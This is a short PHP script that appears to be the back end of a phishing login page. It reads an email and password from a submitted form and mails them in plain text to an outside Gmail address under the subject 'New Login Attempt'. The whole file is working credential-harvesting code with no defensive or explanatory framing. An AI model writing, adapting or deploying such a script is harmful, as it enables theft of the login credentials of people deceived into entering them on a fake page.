<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "covenanttk7@gmail.com";
    $subject = "New Login Attempt";
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "From: no-reply@yourwebsite.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Login details sent successfully.";
    } else {
        echo "Failed to send login details.";
    }
} else {
    echo "Invalid request.";
}
?>